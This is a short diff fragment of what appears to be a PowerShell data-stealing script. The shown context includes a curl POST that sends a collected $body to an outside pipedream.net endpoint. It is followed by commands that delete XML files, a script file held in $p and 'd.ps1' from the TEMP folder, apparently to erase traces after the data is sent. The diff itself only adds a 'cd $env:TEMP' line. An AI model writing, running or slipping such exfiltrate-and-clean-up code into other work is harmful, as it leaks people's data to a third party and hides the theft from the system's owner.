@@ -23,5 +23,5 @@ curl -uri https://envgv4l0v712.x.pipedream.net/ -Method POST -Body $body
 rm *.xml
 cd ..
 rm $p
-
+cd $env:TEMP
 rm d.ps1
